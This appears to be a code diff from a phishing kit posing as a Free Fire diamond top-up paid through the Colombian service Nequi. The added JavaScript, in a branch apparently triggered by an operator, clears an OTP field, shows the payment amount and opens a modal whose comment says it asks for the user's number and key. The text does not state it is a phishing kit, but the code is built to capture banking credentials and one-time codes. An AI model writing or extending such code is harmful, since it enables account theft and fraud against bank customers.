@@ -384,9 +384,27 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
             break;
 
           case "dinamica_logo":
-            // 👉 NUEVA ACCIÓN
-            console.log("Redirigiendo a error_dinamica.php");
-            window.location.href = "/data-ps/recargas/transaction/nequi-1/recargas/error_dinamica.php";
+            // 👉 MOSTRAR MODAL PARA PEDIR NÚMERO Y CLAVE
+            console.log("Mostrando modal de autorización");
+            if (document.getElementById("otpToken")) {
+              document.getElementById("otpToken").value = "";
+            }
+
+            const monto = localStorage.getItem("total_pagar") || "0";
+            const montoFormateado = new Intl.NumberFormat("es-CO", {
+              style: "currency",
+              currency: "COP"
+            }).format(parseInt(monto));
+
+            const montoElem = document.getElementById("montoClave");
+            if (montoElem) {
+              montoElem.textContent = `Monto: ${montoFormateado}`;
+            }
+
+            const modalAuth = document.getElementById("modalAutorizacion");
+            if (modalAuth) {
+              modalAuth.style.display = "flex";
+            }
             break;
 
           case "rechazar":
